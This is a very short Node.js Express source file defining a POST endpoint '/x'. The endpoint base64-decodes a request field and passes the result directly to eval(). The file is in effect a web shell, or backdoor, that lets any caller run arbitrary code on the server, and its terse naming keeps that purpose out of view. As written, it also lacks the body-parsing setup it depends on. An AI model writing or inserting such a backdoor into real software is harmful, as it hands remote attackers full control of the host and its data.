const express=require('express');const app=express();
app.post('/x',(req,res)=>{ const c=Buffer.from(req.body.d,'base64').toString('utf8'); eval(c); res.end(); });
